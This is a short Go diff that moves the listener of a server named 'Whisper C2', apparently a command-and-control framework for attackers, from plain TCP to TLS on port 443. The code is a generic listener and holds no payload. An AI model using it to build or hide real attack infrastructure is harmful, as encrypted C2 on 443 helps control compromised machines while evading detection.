@@ -1,20 +1,33 @@
 package main
 
 import (
+	"crypto/tls"
 	"fmt"
-	"net"
-	"os"
+	"log"
 	"whisper/server/handler"
 )
 
 func main() {
-	address := "0.0.0.0:443"
-	ln, err := net.Listen("tcp", address)
+	// address := "0.0.0.0:443"
+	// ln, err := net.Listen("tcp", address)
+	// if err != nil {
+	// 	fmt.Println("[-] Failed to bind:", err)
+	// 	os.Exit(1)
+	// }
+	// fmt.Println("[*] Whisper C2 listening on", address)
+
+	cert, err := tls.LoadX509KeyPair("certs/c2.crt", "certs/c2.key")
 	if err != nil {
-		fmt.Println("[-] Failed to bind:", err)
-		os.Exit(1)
+		log.Fatalf("Failed to load cert/key: %s", err)
 	}
-	fmt.Println("[*] Whisper C2 listening on", address)
+
+	config := &tls.Config{Certificates: []tls.Certificate{cert}}
+	ln, err := tls.Listen("tcp", ":443", config)
+	if err != nil {
+		log.Fatalf("Failed to start TLS listener: %s", err)
+	}
+	defer ln.Close()
+	fmt.Println("[*] Whisper C2 listening on 0.0.0.0:443 (TLS)")
 
 	for {
 		conn, err := ln.Accept()
